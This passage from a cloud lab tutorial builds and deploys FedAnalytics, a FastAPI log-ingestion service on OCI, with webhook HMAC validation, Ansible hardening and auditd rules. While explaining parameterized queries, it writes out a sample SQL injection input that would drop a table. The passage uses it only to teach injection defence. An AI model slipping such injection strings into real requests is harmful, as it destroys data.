> **Why `IngestRecord` instead of `PersonnelCreate`?** FedAnalytics ingests generic data records — logs, metrics, events — not personnel. The `severity` field enables log filtering at the API level. The `metadata` dict allows flexible key-value data without schema changes. This mirrors real-world log ingestion APIs (like Splunk HEC or Elasticsearch bulk API).

**Step 4: Database helpers** — create tables, connect

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


# --- Database Helpers ---
import sqlite3

def get_db():
    """Get a database connection."""
    if DB_TYPE == "sqlite":
        conn = sqlite3.connect(SQLITE_PATH)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        return conn
    else:
        # Oracle DB — configured via Ansible
        import oracledb
        return oracledb.connect(
            user=os.environ.get("DB_USER", "ADMIN"),
            password=os.environ.get("DB_PASSWORD", ""),
            dsn=os.environ.get("DB_DSN", "fedanalyticsdb_low"),
            config_dir=os.environ.get("DB_WALLET_DIR", "/opt/oracle/wallet"),
            wallet_location=os.environ.get("DB_WALLET_DIR", "/opt/oracle/wallet"),
            wallet_password=os.environ.get("DB_WALLET_PASSWORD", "")
        )


def init_db():
    """Create tables if they don't exist."""
    conn = get_db()
    cursor = conn.cursor()

    # Ingested data table — stores all ingested records
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS ingest_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            batch_id TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            source TEXT NOT NULL,
            data_type TEXT NOT NULL,
            category TEXT NOT NULL,
            severity TEXT DEFAULT 'INFO',
            message TEXT NOT NULL,
            metadata TEXT,
            ingested_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # App logs table — stores application-generated log entries
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS app_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            severity TEXT NOT NULL,
            source TEXT NOT NULL,
            message TEXT NOT NULL,
            details TEXT
        )
    """)

    # Webhook events table — audit trail of received webhooks
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS webhook_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            event_type TEXT NOT NULL,
            source TEXT NOT NULL,
            event_time TEXT,
            payload TEXT,
            signature_valid INTEGER DEFAULT 0,
            action_taken TEXT
        )
    """)

    # Audit log table — CMMC AU compliance (same pattern as Phase 1)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS audit_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            action TEXT NOT NULL,
            resource_type TEXT NOT NULL,
            resource_id TEXT,
            details TEXT,
            source_ip TEXT
        )
    """)

    conn.commit()
    conn.close()


def log_app(severity: str, source: str, message: str, details: str = None):
    """Write an application log entry."""
    conn = get_db()
    conn.execute(
        "INSERT INTO app_logs (severity, source, message, details) VALUES (?, ?, ?, ?)",
        (severity, source, message, details)
    )
    conn.commit()
    conn.close()


def log_audit(action: str, resource_type: str, resource_id=None, details=None, source_ip="unknown"):
    """Write an audit log entry (CMMC AU compliance)."""
    conn = get_db()
    conn.execute(
        "INSERT INTO audit_log (action, resource_type, resource_id, details, source_ip) VALUES (?, ?, ?, ?, ?)",
        (action, resource_type, str(resource_id) if resource_id else None, details, source_ip)
    )
    conn.commit()
    conn.close()
APPEOF
```

> **Why four tables?** Each table serves a distinct purpose: `ingest_data` stores ingested records (the app's core function), `app_logs` stores the app's own operational logs (for the `/logs` endpoint), `webhook_events` is an audit trail of every webhook received (critical for incident investigation), and `audit_log` tracks user actions (CMMC compliance, same as Phase 1). Separation of concerns — don't mix operational data with audit data.

**Step 5: GET /health endpoint** — returning concept

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


# --- API Endpoints ---
# Note: Startup logic (init_db, seeding) is handled by the lifespan function defined in Step 1.

@app.get("/health")
def health_check():
    """
    Health check endpoint — returning concept from Phase 1.
    Used by monitoring scripts, load balancers, Kubernetes probes, and backup validation.
    """
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM ingest_data")
        record_count = cursor.fetchone()[0]
        conn.close()
        db_status = "connected"
    except Exception as e:
        db_status = f"error: {str(e)}"
        record_count = -1

    return {
        "status": "healthy" if db_status == "connected" else "degraded",
        "service": "fedanalytics",
        "version": "2.0.0",
        "database": {"type": DB_TYPE, "status": db_status, "record_count": record_count},
        "metrics_summary": {
            "records_ingested": METRICS["records_ingested"],
            "webhooks_received": METRICS["webhooks_received"]
        },
        "uptime_since": METRICS["start_time"],
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    }
APPEOF
```

> **Why include `record_count` in health?** During DR recovery on Day 4, you'll compare the record count before and after the attack to verify data integrity. A health endpoint that reports record count makes this verification scriptable.

**Step 6: POST /ingest endpoint** — batch data ingestion

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


@app.post("/ingest", response_model=IngestResponse, status_code=201)
def ingest_data(request: IngestRequest):
    """
    Ingest a batch of data records.
    Accepts multiple records in one POST request for efficiency.
    Each record is validated, stored, and counted in metrics.

    Example POST body:
    {
        "source": "firewall-logs",
        "data_type": "logs",
        "records": [
            {"timestamp": "2026-03-20T10:00:00Z", "source": "fw-01", "category": "access", "severity": "INFO", "message": "Allowed TCP 10.0.1.5:443"}
        ]
    }
    """
    import uuid
    batch_id = str(uuid.uuid4())[:8]

    conn = get_db()
    accepted = 0
    rejected = 0

    for record in request.records:
        try:
            conn.execute(
                """INSERT INTO ingest_data
                   (batch_id, timestamp, source, data_type, category, severity, message, metadata)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (batch_id, record.timestamp, record.source, request.data_type,
                 record.category, record.severity, record.message,
                 json.dumps(record.metadata) if record.metadata else None)
            )
            accepted += 1
        except Exception as e:
            rejected += 1
            log_app("ERROR", "ingest", f"Failed to ingest record: {str(e)}")

    conn.commit()
    conn.close()

    # Update metrics
    METRICS["records_ingested"] += accepted
    METRICS["ingest_errors"] += rejected
    METRICS["last_ingest_time"] = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    log_audit("INGEST", "ingest_data", resource_id=batch_id,
              details=f"Batch {batch_id}: {accepted} accepted, {rejected} rejected from {request.source}")
    log_app("INFO", "ingest", f"Batch {batch_id} processed: {accepted} accepted, {rejected} rejected")

    return IngestResponse(
        status="complete",
        records_accepted=accepted,
        records_rejected=rejected,
        batch_id=batch_id,
        timestamp=datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    )
APPEOF
```

> **Why batch ingestion?** Sending records one at a time creates network overhead — 1000 records = 1000 HTTP requests. Batch ingestion sends all 1000 in one POST. This is how production data pipelines work (Splunk HTTP Event Collector, Elasticsearch Bulk API, AWS Kinesis PutRecords). The `batch_id` ties records together for tracing — "which records came in together?"

**Step 7: GET /ingest/status endpoint** — pipeline status

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


@app.get("/ingest/status")
def ingest_status():
    """
    Pipeline status — how many records have been ingested, last run time, error rate.
    Used by monitoring dashboards and backup validation scripts.
    """
    conn = get_db()
    cursor = conn.cursor()

    # Total records
    cursor.execute("SELECT COUNT(*) FROM ingest_data")
    total_records = cursor.fetchone()[0]

    # Records by severity
    cursor.execute("SELECT severity, COUNT(*) FROM ingest_data GROUP BY severity")
    by_severity = {row[0]: row[1] for row in cursor.fetchall()}

    # Recent batches
    cursor.execute("""
        SELECT batch_id, source, COUNT(*) as record_count, MAX(ingested_at) as last_record
        FROM ingest_data
        GROUP BY batch_id, source
        ORDER BY last_record DESC
        LIMIT 5
    """)
    recent_batches = [
        {"batch_id": row[0], "source": row[1], "record_count": row[2], "ingested_at": row[3]}
        for row in cursor.fetchall()
    ]

    conn.close()

    return {
        "pipeline_status": "active" if METRICS["last_ingest_time"] else "idle",
        "total_records": total_records,
        "records_by_severity": by_severity,
        "recent_batches": recent_batches,
        "last_ingest_time": METRICS["last_ingest_time"],
        "error_count": METRICS["ingest_errors"],
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    }
APPEOF
```

**Step 8: POST /webhook endpoint** — THE API PILLAR CONCEPT

> **🧠 ELI5 — What is a Webhook?**
>
> Imagine two patterns for checking if you got mail:
>
> | Pattern | How It Works | Analogy |
> |---------|-------------|---------|
> | **Polling** | You walk to the mailbox every 5 minutes and check | Your app calls an API repeatedly: "Any new events? How about now? Now?" |
> | **Webhook** | The mail carrier rings your doorbell when mail arrives | The service calls YOUR API when something happens — you just listen |
>
> A webhook is a URL that another service calls when an event occurs. Instead of your app constantly asking "did anything happen?", the other service tells you. Your app exposes a POST endpoint (the "doorbell"), and the external service sends an HTTP POST to it with event details when something happens.
>
> **In OCI:** When a file is uploaded to Object Storage, OCI Events can send a webhook to your app's `/webhook` endpoint. Your app receives the event details (which file, which bucket, who uploaded it) and takes action — like triggering a backup validation or logging an audit event.
>
> **Webhook signature validation:** How do you know the webhook is really from OCI and not from an attacker? The sender includes a cryptographic signature in the HTTP headers. Your app computes the expected signature using a shared secret and compares them. If they match, the webhook is authentic. This is like checking a wax seal on a letter — only the real sender has the seal.

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


@app.post("/webhook")
async def receive_webhook(
    request: Request,
    x_webhook_signature: Optional[str] = Header(default=None, alias="X-Webhook-Signature")
):
    """
    Receive webhook notifications from OCI Events or other services.

    Webhooks are the Phase 2 API Pillar concept — event-driven API patterns.

    Flow:
    1. OCI Event occurs (e.g., file uploaded to Object Storage)
    2. OCI Events service sends HTTP POST to this endpoint
    3. We validate the signature (is this really from OCI?)
    4. We parse the event and take action (log it, trigger backup validation, alert)

    Headers expected:
    - X-Webhook-Signature: HMAC-SHA256 signature of the request body
    """
    # Read raw request body (needed for signature validation)
    body = await request.body()
    body_str = body.decode("utf-8")

    # Validate webhook signature
    signature_valid = False
    if x_webhook_signature and WEBHOOK_SECRET != "change-me-in-production":
        # Compute expected signature: HMAC-SHA256(secret, body)
        expected_sig = hmac.new(
            WEBHOOK_SECRET.encode("utf-8"),
            body,
            hashlib.sha256
        ).hexdigest()
        signature_valid = hmac.compare_digest(expected_sig, x_webhook_signature)
    elif WEBHOOK_SECRET == "change-me-in-production":
        # In lab mode, accept all webhooks but log a warning
        signature_valid = True
        log_app("WARNING", "webhook", "Webhook secret not configured — accepting without validation")

    # Update metrics
    METRICS["webhooks_received"] += 1
    if signature_valid:
        METRICS["webhooks_validated"] += 1
    else:
        METRICS["webhooks_rejected"] += 1

    # Parse the event payload
    try:
        event_data = json.loads(body_str)
        event_type = event_data.get("eventType", "unknown")
        event_source = event_data.get("source", "unknown")
        event_time = event_data.get("eventTime", datetime.now(timezone.utc).isoformat())
    except json.JSONDecodeError:
        raise HTTPException(status_code=400, detail="Invalid JSON in webhook body")

    # Determine action based on event type
    action_taken = "logged"
    if "objectstorage" in event_type.lower():
        action_taken = "backup_event_logged"
        log_app("INFO", "webhook", f"Object Storage event: {event_type}", body_str[:500])
    elif "compute" in event_type.lower():
        action_taken = "compute_event_logged"
        log_app("WARNING", "webhook", f"Compute event: {event_type}", body_str[:500])
    elif "database" in event_type.lower():
        action_taken = "database_event_logged"
        log_app("WARNING", "webhook", f"Database event: {event_type}", body_str[:500])
    else:
        log_app("INFO", "webhook", f"Generic event: {event_type}", body_str[:500])

    # Store webhook event in database for audit trail
    conn = get_db()
    conn.execute(
        """INSERT INTO webhook_events
           (event_type, source, event_time, payload, signature_valid, action_taken)
           VALUES (?, ?, ?, ?, ?, ?)""",
        (event_type, event_source, event_time, body_str[:2000], 1 if signature_valid else 0, action_taken)
    )
    conn.commit()
    conn.close()

    log_audit("WEBHOOK_RECEIVED", "webhook", details=f"Event: {event_type}, Signature valid: {signature_valid}")

    return {
        "status": "accepted" if signature_valid else "accepted_unvalidated",
        "event_type": event_type,
        "signature_valid": signature_valid,
        "action_taken": action_taken,
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    }
APPEOF
```

> **Why `async def` for the webhook endpoint?** The webhook endpoint uses `await request.body()` to read the raw request body before parsing it. This is necessary because we need the exact bytes for signature validation — if FastAPI parsed it first, the bytes might differ from what the sender signed. The `async` keyword enables `await`.

> **Why `hmac.compare_digest()` instead of `==`?** A timing attack can exploit `==` for string comparison — the comparison stops at the first different character, and by measuring how long the comparison takes, an attacker can guess the signature one character at a time. `hmac.compare_digest()` takes the same time regardless of where the strings differ. This is a real security concern in production webhook handlers.

> **💼 Interview Insight — Webhooks:** When interviewers ask about event-driven architectures, webhooks are the simplest entry point. A strong answer: "I implemented webhook receivers for OCI Events — when a file is uploaded to Object Storage, OCI sends a POST to my app's `/webhook` endpoint. I validate the HMAC-SHA256 signature against a shared secret to prevent spoofed events, parse the event type, and take appropriate action. Compared to polling, webhooks reduce latency from minutes to seconds and eliminate wasted API calls." A weak answer just says "webhooks are callbacks" without explaining signature validation or why they're better than polling.

> **💼 Interview Insight — REST vs Webhooks Comparison:**
>
> | Aspect | REST API (Polling) | Webhook |
> |--------|-------------------|---------|
> | **Direction** | Client → Server (you ask) | Server → Client (you listen) |
> | **Trigger** | Your schedule (every N seconds) | Event occurrence (real-time) |
> | **Efficiency** | Wasteful — most polls return "nothing new" | Efficient — only fires when something happens |
> | **Latency** | Up to N seconds (your poll interval) | Near real-time (seconds) |
> | **Reliability** | You control retry logic | Sender retries on failure (usually) |
> | **Security** | API key/token on your requests | Signature validation on incoming requests |
> | **Example** | `GET /events?since=2026-03-20` every 30s | OCI sends POST to your `/webhook` when event occurs |
>
> "In production, I use both: webhooks for real-time event processing, polling as a fallback for missed webhooks. Belt and suspenders."

**Step 9: GET /logs endpoint** — query log entries with severity filtering

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


@app.get("/logs")
def get_logs(
    severity: Optional[str] = Query(default=None, description="Filter by severity (DEBUG, INFO, WARNING, ERROR, CRITICAL)"),
    source: Optional[str] = Query(default=None, description="Filter by source"),
    limit: int = Query(default=50, ge=1, le=500, description="Maximum logs to return"),
    skip: int = Query(default=0, ge=0, description="Number of logs to skip")
):
    """
    Query application log entries with optional severity and source filtering.
    Used during incident investigation — "show me all ERROR logs from the last hour."
    """
    conn = get_db()

    query = "SELECT * FROM app_logs WHERE 1=1"
    params = []

    if severity:
        query += " AND severity = ?"
        params.append(severity.upper())
    if source:
        query += " AND source = ?"
        params.append(source)

    query += " ORDER BY timestamp DESC LIMIT ? OFFSET ?"
    params.extend([limit, skip])

    rows = conn.execute(query, params).fetchall()
    conn.close()

    logs = [dict(row) for row in rows]

    return {
        "count": len(logs),
        "filters": {"severity": severity, "source": source},
        "skip": skip,
        "limit": limit,
        "logs": logs
    }
APPEOF
```

> **Why parameterized queries (? placeholders)?** Returning concept from Phase 1 — never concatenate user input into SQL. Parameterized queries prevent SQL injection. If someone sends `severity='; DROP TABLE app_logs; --`, the `?` placeholder treats it as a literal string, not SQL code.

**Step 10: GET /metrics endpoint** — pipeline metrics

```bash
cat >> ~/oci-federal-lab-phase2/app/main.py << 'APPEOF'


@app.get("/metrics")
def get_metrics():
    """
    Pipeline metrics — counters and gauges for monitoring.
    In production, these would feed into Prometheus/Grafana.
    For this lab, they help verify the app is processing data correctly.
    """
    conn = get_db()
    cursor = conn.cursor()

    # Database-level metrics
    cursor.execute("SELECT COUNT(*) FROM ingest_data")
    total_ingested = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM webhook_events")
    total_webhooks = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM app_logs WHERE severity = 'ERROR'")
    error_logs = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM audit_log")
    audit_entries = cursor.fetchone()[0]

    conn.close()

    return {
        "application": {
            "records_ingested": METRICS["records_ingested"],
            "ingest_errors": METRICS["ingest_errors"],
            "last_ingest_time": METRICS["last_ingest_time"],
            "uptime_since": METRICS["start_time"]
        },
        "webhooks": {
            "received": METRICS["webhooks_received"],
            "validated": METRICS["webhooks_validated"],
            "rejected": METRICS["webhooks_rejected"]
        },
        "database": {
            "total_ingested_records": total_ingested,
            "total_webhook_events": total_webhooks,
            "error_log_count": error_logs,
            "audit_entries": audit_entries
        },
        "timestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    }
APPEOF
```

> **🧠 Putting it together:** FedAnalytics has six endpoints that form a complete monitoring story:
> - `POST /ingest` — data flows IN (CSV batches from external systems)
> - `GET /ingest/status` — pipeline health dashboard
> - `POST /webhook` — events flow IN (OCI cloud events, automated alerts)
> - `GET /logs` — investigate problems (filter by severity during incidents)
> - `GET /metrics` — operational counters (before/after comparison during DR)
> - `GET /health` — is everything alive? (Kubernetes probes, monitoring scripts)
>
> During the Day 4 ransomware drill, you'll use `/health`, `/metrics`, and `/logs` to detect the attack, and `/ingest/status` to verify data recovery.

**Step 11: Verify the complete app file**

> **Note:** Startup and seeding logic is handled by the `lifespan` function defined in Step 1. This replaces the deprecated `@app.on_event("startup")` pattern from FastAPI 0.95+.

**Verify the complete app file:**

```bash
wc -l ~/oci-federal-lab-phase2/app/main.py
# Expected: ~320-350 lines

grep "^@app\." ~/oci-federal-lab-phase2/app/main.py
# Expected: @app.get("/health"), @app.post("/ingest"), @app.get("/ingest/status"),
#           @app.post("/webhook"), @app.get("/logs"), @app.get("/metrics")

grep "def " ~/oci-federal-lab-phase2/app/main.py | head -15
# Expected: lifespan, get_db, init_db, log_app, log_audit, health_check,
#           ingest_data, ingest_status, receive_webhook, get_logs, get_metrics
```

---

### Step 21.3 — Create Requirements File
📍 **Editor**

```bash
cat > ~/oci-federal-lab-phase2/app/requirements.txt << 'EOF'
fastapi>=0.100.0
uvicorn>=0.23.0
pydantic>=2.0.0
oracledb>=1.0.0
EOF
```

---

### Step 21.4 — Create Ansible Playbook for Deployment
📍 **Editor** (build by hand — returning concept, abbreviated)

**Create systemd service template:**

```bash
cat > ~/oci-federal-lab-phase2/ansible/templates/fedanalytics.service.j2 << 'EOF'
# systemd service file for FedAnalytics
# Returning concept from Phase 1 — same pattern as FedTracker

[Unit]
Description=FedAnalytics Federal Data Ingestion API
After=network.target

[Service]
Type=simple
User=clouduser
Group=clouduser
WorkingDirectory=/opt/fedanalytics
Environment="DB_TYPE={{ db_type | default('sqlite') }}"
Environment="SQLITE_PATH=/opt/fedanalytics/fedanalytics.db"
Environment="WEBHOOK_SECRET={{ webhook_secret | default('lab-secret-change-in-prod') }}"
ExecStart=/usr/bin/python3 -m uvicorn main:app --host 0.0.0.0 --port 8000
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
```

**Create deployment playbook:**

```bash
cat > ~/oci-federal-lab-phase2/ansible/playbooks/deploy_app.yml << 'EOF'
---
# Deploy FedAnalytics to app server
# Returning concept — same Ansible patterns as Phase 1, new application

- name: Deploy FedAnalytics Application
  hosts: app
  become: yes

  vars:
    app_dir: /opt/fedanalytics
    app_user: clouduser
    db_type: sqlite
    webhook_secret: "lab-secret-change-in-prod"

  tasks:
    # --- System setup ---
    - name: Create application user
      user:
        name: "{{ app_user }}"
        shell: /bin/bash
        create_home: yes

    - name: Install system dependencies
      dnf:
        name:
          - python3
          - python3-pip
          - curl
        state: present

    # --- Application deployment ---
    - name: Create application directory
      file:
        path: "{{ app_dir }}"
        state: directory
        owner: "{{ app_user }}"
        group: "{{ app_user }}"
        mode: '0755'

    - name: Copy application code
      copy:
        src: "../../app/main.py"
        dest: "{{ app_dir }}/main.py"
        owner: "{{ app_user }}"
        group: "{{ app_user }}"
        mode: '0644'
      notify: restart fedanalytics

    - name: Copy requirements file
      copy:
        src: "../../app/requirements.txt"
        dest: "{{ app_dir }}/requirements.txt"
        owner: "{{ app_user }}"
        group: "{{ app_user }}"
        mode: '0644'

    - name: Install Python dependencies
      pip:
        requirements: "{{ app_dir }}/requirements.txt"
        executable: /usr/bin/python3 -m pip
        state: present

    - name: Verify Python dependencies are importable
      command: python3 -c "import fastapi; import uvicorn; print('deps OK')"
      changed_when: false

    # --- systemd service ---
    - name: Deploy systemd service file
      template:
        src: "../templates/fedanalytics.service.j2"
        dest: /etc/systemd/system/fedanalytics.service
        mode: '0644'
      notify: restart fedanalytics

    - name: Enable and start FedAnalytics service
      systemd:
        name: fedanalytics
        enabled: yes
        state: started
        daemon_reload: yes

    # --- SELinux ---
    # Federal environments require SELinux in enforcing mode.
    # If the service fails, check: sudo ausearch -m avc -ts recent
    # Then create a custom policy: audit2allow -M fedanalytics && sudo semodule -i fedanalytics.pp

    # --- Firewall ---
    - name: Open port 8000 in firewall
      firewalld:
        port: 8000/tcp
        permanent: yes
        state: enabled
        immediate: yes
      ignore_errors: yes  # firewalld may not be running

    # --- Verification ---
    - name: Wait for service to start
      wait_for:
        port: 8000
        timeout: 30

    - name: Verify health endpoint
      uri:
        url: http://localhost:8000/health
        return_content: yes
      register: health_result

    - name: Display health check result
      debug:
        msg: "FedAnalytics health: {{ health_result.json.status }}"

  handlers:
    - name: restart fedanalytics
      systemd:
        name: fedanalytics
        state: restarted
        daemon_reload: yes
EOF
```

> **Federal Reality Check: SELinux**
>
> Oracle Linux 9 ships with SELinux in enforcing mode. If your service fails to start, check SELinux first:
> ```bash
> # Check if SELinux is blocking your service
> sudo ausearch -m avc -ts recent
>
> # If you see denials for your app, create a custom policy:
> sudo ausearch -m avc -ts recent | audit2allow -M fedanalytics
> sudo semodule -i fedanalytics.pp
>
> # NEVER run setenforce 0 in a federal environment — that's an automatic audit failure
> getenforce  # Should always say "Enforcing"
> ```
>
> **Interview Insight:** "Is SELinux enforcing?" is the first question a federal auditor asks. The answer must always be "Yes, with custom policies for our applications."

**Create hardening playbook (abbreviated — same pattern as Phase 1):**

```bash
cat > ~/oci-federal-lab-phase2/ansible/playbooks/harden.yml << 'EOF'
---
# Server hardening — returning concept from Phase 1
# Same security baseline: SSH hardening, firewall, auditd

- name: Harden Server
  hosts: app
  become: yes

  tasks:
    - name: Set SSH to key-only authentication
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: "{{ item.regexp }}"
        line: "{{ item.line }}"
      loop:
        - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no' }
        - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no' }
        - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 3' }
      notify: restart sshd

    - name: Install and enable auditd
      dnf:
        name: audit
        state: present

    - name: Enable auditd service
      systemd:
        name: auditd
        enabled: yes
        state: started

    - name: Add audit rules for critical files
      copy:
        content: |
          # Monitor SSH config changes
          -w /etc/ssh/sshd_config -p wa -k ssh_config
          # Monitor passwd/shadow changes
          -w /etc/passwd -p wa -k identity
          -w /etc/shadow -p wa -k identity
          # Monitor application directory
          -w /opt/fedanalytics/ -p wa -k app_changes
          # Monitor cron
          -w /etc/crontab -p wa -k cron_changes
          -w /var/spool/cron/ -p wa -k cron_changes
        dest: /etc/audit/rules.d/fedanalytics.rules
        mode: '0640'
      notify: restart auditd

    - name: Deploy legal banner
      copy:
        content: |
          ************************************************************
          * WARNING: This is a U.S. Government information system.   *
          * Unauthorized access is prohibited. All activity is        *
          * monitored and recorded. By accessing this system, you     *
          * consent to monitoring.                                    *
          ************************************************************
        dest: /etc/issue.net
        mode: '0644'

    - name: Enable SSH banner
      lineinfile:
        path: /etc/ssh/sshd_config
        regexp: '^#?Banner'
        line: 'Banner /etc/issue.net'
      notify: restart sshd

  handlers:
    - name: restart sshd
      systemd:
        name: sshd
        state: restarted

    - name: restart auditd
      command: service auditd restart
EOF
```

---

### Step 21.5 — Deploy with Ansible
📍 **WSL2 Terminal** (Windows) / **Local Terminal** (macOS/Linux)

```bash
cd ~/oci-federal-lab-phase2

# Run hardening first
ansible-playbook -i ansible/inventory.ini ansible/playbooks/harden.yml
# Expected: all tasks ok/changed, no failures

# Deploy FedAnalytics
ansible-playbook -i ansible/inventory.ini ansible/playbooks/deploy_app.yml
# Expected: "FedAnalytics health: healthy"
```

**Verify from your machine:**

```bash
# Test through SSH tunnel
ssh app-server-p2 "curl -s http://localhost:8000/health" | python3 -m json.tool
# Expected: {"status": "healthy", "service": "fedanalytics", ...}

ssh app-server-p2 "curl -s http://localhost:8000/docs" | head -5
# Expected: HTML content (Swagger UI auto-generated docs)
```

**Test the ingest endpoint:**

```bash
ssh app-server-p2 'curl -s -X POST http://localhost:8000/ingest \
  -H "Content-Type: application/json" \
  -d '"'"'{
    "source": "test-client",
    "data_type": "logs",
    "records": [
      {"timestamp": "2026-03-20T12:00:00Z", "source": "test", "category": "access", "severity": "INFO", "message": "Test log entry from deployment verification"}
    ]
  }'"'"'' | python3 -m json.tool
# Expected: {"status": "complete", "records_accepted": 1, ...}
```

**Test the webhook endpoint:**

```bash
ssh app-server-p2 'curl -s -X POST http://localhost:8000/webhook \
  -H "Content-Type: application/json" \
  -d '"'"'{
    "eventType": "com.oraclecloud.objectstorage.createobject",
    "source": "ObjectStorage",
    "eventTime": "2026-03-20T12:05:00Z",
    "data": {"bucketName": "fedanalytics-backups", "objectName": "backup-2026-03-20.sql"}
  }'"'"'' | python3 -m json.tool
# Expected: {"status": "accepted_unvalidated", "event_type": "com.oraclecloud.objectstorage.createobject", ...}
```

**Test the logs endpoint:**

```bash
ssh app-server-p2 "curl -s 'http://localhost:8000/logs?severity=INFO&limit=5'" | python3 -m json.tool
# Expected: Log entries filtered by INFO severity

ssh app-server-p2 "curl -s http://localhost:8000/metrics" | python3 -m json.tool
# Expected: Metrics with records_ingested > 0, webhooks_received > 0
```

<sub><em style="color: #999; font-size: 0.65em;">

💡🖥️ Commands used:

| Command | Flag(s) | What It Does |
|---------|---------|-------------|
| `ansible-playbook` | `-i inventory.ini` | Run playbook against hosts in inventory file |
| `curl` | `-s -X POST -H -d` | `-s`=silent, `-X`=HTTP method, `-H`=header, `-d`=data body |
| `python3 -m json.tool` | | Pretty-print JSON output |

</em></sub>

---

### Step 21.6 — Git Commit
📍 **Local Terminal**

```bash
cd ~/oci-federal-lab-phase2

git add phases/phase-2-fedanalytics-dr/ .gitignore
git commit -m "Phase 2 Day 1: Terraform infra + Ansible deploy + FedAnalytics app

- Terraform: VCN, subnets, bastion, app-server, Autonomous DB
- Ansible: hardening playbook + FedAnalytics deployment playbook
- FedAnalytics: FastAPI app with 6 endpoints (ingest, webhook, logs, metrics, health, ingest/status)
- Webhook endpoint with HMAC-SHA256 signature validation (Phase 2 API Pillar)
- systemd service management"

git push
```

---

### Phase 21 Troubleshooting

| Check | Expected | If It Fails |
|-------|----------|-------------|
| `ansible all -m ping` succeeds | SUCCESS for all hosts | Check inventory IPs match terraform output. Check SSH key path. Check ProxyJump config |
| Hardening playbook completes | All tasks ok/changed | If sshd restart fails: check sshd_config syntax with `sshd -t` on the VM |
| Deploy playbook completes | Health check shows "healthy" | Check `journalctl -u fedanalytics` on the VM. Missing Python packages? Check pip install task |
| `curl /health` returns JSON | `{"status": "healthy", ...}` | Service not running? `sudo systemctl status fedanalytics`. Port blocked? Check firewall |
| `curl /ingest` accepts data | `{"status": "complete", ...}` | 422 error = malformed JSON body. Check the JSON structure matches IngestRequest model |
| `curl /webhook` accepts event | `{"status": "accepted_unvalidated", ...}` | 400 error = invalid JSON. Check body is valid JSON with eventType and source fields |

---

### Phase 21 Complete ✅

**What you built:**
- Terraform infrastructure: VCN, public/private subnets, bastion host, application server, Autonomous Database
- Ansible hardening playbook: SSH lockdown, firewall, users, auto-updates (Oracle Linux 9)
- Ansible deployment playbook: FedAnalytics FastAPI app with systemd service management
- FedAnalytics API: 6 endpoints (ingest, webhook, logs, metrics, health, ingest/status)
- Webhook endpoint with HMAC-SHA256 signature validation (Phase 2 API Pillar)
- OCI Generative AI integration for compliance report generation

**What's running:**
- Bastion host (SSH gateway)
- Application server with FedAnalytics API (systemd-managed)
- Autonomous Database with analytics schema
- All accessible via SSH through bastion

**Next:** Phase 21B completes the API Pillar by placing OCI API Gateway in front of FedAnalytics — the managed entry point with rate limiting.

---

## PHASE 21B: OCI API GATEWAY — MANAGED API ENTRY POINT (1.5 hrs)

> **🧠 ELI5 — What is an API Gateway?** So far, clients talk directly to your FedAnalytics app — `curl http://app-server:8000/ingest`. That works in a lab, but in production it's a problem. What stops someone from sending 10,000 requests per second and crashing your app? What if you want to route `/v1/` to one version and `/v2/` to another? What if you need to validate JWT tokens before requests reach your code?
>
> An API Gateway sits between the client and your backend. It's like a receptionist at a government building — before you reach any office, the receptionist checks your badge, makes sure you're going to the right floor, and limits how many people can enter per minute. OCI API Gateway does this as a managed service — you define routes and policies, OCI runs the infrastructure.
>
> **This is the second half of the Phase 2 API Pillar.** Phase 1 taught REST fundamentals (building the API). Phase 2 Step 8 taught webhooks (receiving events). Now you learn how to manage and protect APIs with a gateway — the pattern used in every production federal system.

> **Cost:** OCI API Gateway is free for the first 1 million API calls per month. More than enough for this lab.

> 📍 **Where work happens:** OCI Console for initial setup, then Terraform for infrastructure-as-code. Testing from local terminal.
>
> 🛠️ **Build approach:** Console first (understand the concepts), then Terraform (automate it).

---

### Step 21B.1 — Understand the Architecture

```
Before API Gateway:
  Client ──────────────────────▶ FedAnalytics (port 8000)
                                  (no protection)

After API Gateway:
  Client ──▶ OCI API Gateway ──▶ FedAnalytics (port 8000)
             │                    (protected)
             ├── Rate limiting (100 req/min)
             ├── CORS policy
             ├── Request validation
             └── Route management (/v1/*, /v2/*)
```

